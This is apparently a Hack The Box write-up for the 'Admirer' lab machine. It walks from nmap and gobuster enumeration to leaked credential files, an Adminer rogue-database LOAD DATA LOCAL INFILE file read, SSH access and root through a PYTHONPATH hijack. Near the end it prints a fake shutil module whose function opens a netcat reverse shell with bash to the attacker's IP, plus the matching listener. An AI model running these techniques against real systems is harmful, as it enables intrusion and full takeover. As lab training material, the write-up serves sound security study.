---
title: Admirer
date: 2020-08-01 00:00:00 +0200
categories: [Hack The Box, Active]
tags: [SQLi, linux, MySQL, easy]
---

![AdmirerCard]({{site.baseurl}}/assets/img/HackTheBox/Admirer/Admirer.png)

# Reconnaissance & Enumeration

Let's first start by looking at what ports are open on the machine:

```bash
$ nmap -sS -sC -sV -p- 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 19:28 CEST
Nmap scan report for 10.10.10.187
Host is up (0.023s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.88 seconds
```

From this, we see there are 3 ports open: `21`, `22` and `80`. On port `80` there is an interesting piece of information.

```
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
```

![WebPage]({{site.baseurl}}/assets/img/HackTheBox/Admirer/websiteAdmirer.png)

## Web

We now know that there is a `robot.txt` and a folder called `/admin-dir`. Let's look at the content of `robot.txt`:

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

This confirmed my initial suspicion that there is some interesting stuff in the folder `/admin-dir`. Let's use `gobuster` to see if there is anything interesting there:

```bash
gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirb/big.txt -x txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/08/03 19:36:14 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
===============================================================
2020/08/03 19:38:04 Finished
===============================================================
```

From this we get 2 interesting files: `contacts.txt` and `credentials.txt`

**contact.txt**

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

**credentials.txt**

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

## FTP

Let's try to connect to ftp with the login and password that we are given in `credentials.txt`

```bash
ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:fukurou): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```

Let's download and inspect both files we found.

## Files Content

The content of the dump wasn't really usefulbut the backup of the website was more interesting.
The interesting stuff seems to be the `index.php` file and the `utility-scripts` folder.

**index.php**

```
<!DOCTYPE HTML>
<!--
        Multiverse by HTML5 UP
        html5up.net | @ajlkn
        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
        <head>
                <title>Admirer</title>
                <meta charset="utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
                <link rel="stylesheet" href="assets/css/main.css" />
                <noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
        </head>
        <body class="is-preload">

                <!-- Wrapper -->
                        <div id="wrapper">

                                <!-- Header -->
                                        <header id="header">
                                                <h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>
                                                <nav>
                                                        <ul>
                                                                <li><a href="#footer" class="icon solid fa-info-circle">About</a></li>
                                                        </ul>
                                                </nav>
                                        </header>

                                <!-- Main -->
                                        <div id="main">
                                         <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>";
                                                        echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>";
                                                        echo "<h2>".$row["title"]."</h2>";
                                                        echo "<p>".$row["text"]."</p>";
                                                    echo "</article>";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
                                        </div>

                                <!-- Footer -->
                                        <footer id="footer" class="panel">
                                                <div class="inner split">
                                                        <div>
                                                                <section>
                                                                        <h2>Allow yourself to be amazed</h2>
                                                                        <p>Skills are not to be envied, but to feel inspired by.<br>
                                                                        Visual arts and music are there to take care of your soul.<br><br>
                                                                        Let your senses soak up these wonders...<br><br><br><br>
                                                                        </p>
                                                                </section>
                                                                <section>
                                                                        <h2>Follow me on ...</h2>
                                                                        <ul class="icons">
                                                                                <li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
                                                                                <li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
                                                                                <li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
                                                                                <li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
                                                                                <li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
                                                                                <li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
                                                                        </ul>
                                                                </section>
                                                        </div>
                                                        <div>
                                                                <section>
                                                                        <h2>Get in touch</h2>
                                                                        <form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
                                                                                <div class="fields">
                                                                                        <div class="field half">
                                                                                                <input type="text" name="name" id="name" placeholder="Name" />
                                                                                        </div>
                                                                                        <div class="field half">
                                                                                                <input type="text" name="email" id="email" placeholder="Email" />
                                                                                        </div>
                                                                                        <div class="field">
                                                                                                <textarea name="message" id="message" rows="4" placeholder="Message"></textarea>
                                                                                        </div>
                                                                                </div>
                                                                                <ul class="actions">
                                                                                        <li><input type="submit" value="Send" class="primary" /></li>
                                                                                        <li><input type="reset" value="Reset" /></li>
                                                                                </ul>
                                                                        </form>
                                                                </section>
                                                        </div>
                                                </div>
                                        </footer>

                        </div>

                <!-- Scripts -->
                        <script src="assets/js/jquery.min.js"></script>
                        <script src="assets/js/jquery.poptrox.min.js"></script>
                        <script src="assets/js/browser.min.js"></script>
                        <script src="assets/js/breakpoints.min.js"></script>
                        <script src="assets/js/util.js"></script>
                        <script src="assets/js/main.js"></script>

        </body>
</html>
```

**admin_tasks.php**

```
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  //
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /***********************************************************************************
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  }
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>
```

**db_admin.php**

```
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

## The Database

Here is where I first hit a dead end. I tried to connect to the `db_admin.php` but it didn't exist. Then I started looking at `index.php` and saw that the database name was `admirerdb`. Out of desperation I google `admirer db` and got a hit on `adminer`. At the end of the `db_admin.php` file you can read this line:

`// TODO: Finish implementing this or find a better open source alternative`

So my guess was that he is using `Adminer` instead (Also a friend pointed out the puns that they love to make @ HTB) and I tried the following address since it works more or less the same as PhpmyAdmin.

`http://10.10.10.187/utility-scripts/adminer.php`

![WebPortal]({{site.baseurl}}/assets/img/HackTheBox/Admirer/DB.png)

Let's try the `user`, `password` and `db_name` from `index.php` but no luck the password is wrong.

Time to exploit

# Exploitation

One of the first things we can see is the double versions on the top. First reflex: "google for a vulnerability". The first hit was the best with a small video to exploit the exploit: [https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

So let's setup our databse for this.

## Setup

Let's first create a database (I called it exploit) and only have one table so we can dump everything we need.

```SQL
CREATE DATABASE exploit
USE exploit;
CREATE TABLE dmp(content varchar(500));
```

Now let's create a user to connect to this database and give him some priviledges

```SQL
CREATE USER 'demo'@'%' IDENTIFIED BY 'demopassword';
GRANT ALL PRIVILEDGES ON * . * TO 'demo'@'%';
FLUSH PRIVILEDGES;
```

Finally let's make sure we can connect from the website and modify the following line of `/etc/mysql/mariadb.conf.d/50_server.cnf`

```
bind-address        = 0.0.0.0
```

Restart mysql

```bash
systemctl restart mysql
```

Now time to host

```bash
mysql -h localhost -u demo -p exploit
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 67
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [exploit]>
```

Connect to through the portal using your `IP ADDRESS` from `tun0`, the user `demo` and his password and connect to the `exploit` database and tada

![connected]({{site.baseurl}}/assets/img/HackTheBox/Admirer/connectedDB.png)

## Actually using the exploit

Now that we are connected we can have some fun. Let's first try to load data in our table

```SQL
load data local infile "/etc/passwd"
info table dmp
field terminated by "/n"
```

But in this case we get an error saying we can't open the file (kind of obvious but never hurts to try)

If you remember the `index.php`, the password for the database was clear on that file. Let's load this file in our table:

```SQL
load data local infile "../index.php"
info table dmp
field terminated by "/n"
```

![passwordUser]({{site.baseurl}}/assets/img/HackTheBox/Admirer/waldoPass.png)

And we get something now: THE PASSWORD for `waldo` : `&<h5b~yK3F#{PaPB&dA}{H>`

## Get User Flag

If you remember from our first part, there was ssh running so let's try and connect with the `user`:`password` we just got:

```bash
ssh waldo@10.10.10.187
waldo@10.10.10.187's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
27e.......................44

```

GET A USER FLAG

# Priviledge Escalation

Let's do a quick check of what we can do as admin if anything:

```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo:

Sorry, try again.
[sudo] password for waldo:
Sorry, try again.
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

So we can execute `admin_tasks.sh` let's check what there is there:

```bash
waldo@admirer:/opt/scripts$ cat admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

Here there is a python script `backup.py` conviniently in the same folder:

```python
waldo@admirer:/opt/scripts$ cat backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

Finally something we can user. Let's create our own `shutil` and thus changing the python import. Now we can make it execute anything but just to be fun let's get a root shell. I went to `/tmp` and created a folder called `exploit` and nanoed a `shutil.py` file with the following in it:

```Python
import os

def make_archive(a, b, c):
    os.system('nc [YOUR IP] 4444 -e "/bin/bash"')
```

Since we know that the original function takes 3 arguments we also need these even if we aren't using them at all.

Let's execute the `admin_tasks.sh`:

```bash
waldo@admirer:/tmp/exploit$ sudo PYTHONPATH=/tmp/exploit /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...

```

Don't forget to run netcat on another terminal:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.187] 42688
python -c "import pty; pty.spawn('/bin/bash')"
root@admirer:/tmp/exploit# cd
cd
root@admirer:~# ls
ls
root.txt
root@admirer:~#
```

GET A ROOT FLAG
